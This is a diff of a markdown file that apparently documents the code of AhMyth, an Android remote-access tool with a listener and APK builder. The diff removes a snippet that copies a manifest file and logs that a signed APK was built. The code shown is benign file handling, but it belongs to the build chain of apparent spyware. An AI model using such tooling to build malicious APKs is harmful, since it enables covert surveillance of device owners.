@@ -80,22 +80,6 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
     }
 ```
     
-manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
-```javascript
-                            fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
-                              if (err) throw err;
-                            
-                              $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                              $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);                        
-
-                            });
-                          });
-                    });
-            });
-
-    }
-```
-    
 Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
 ```javascript
     // when user clicks Disconnect Button
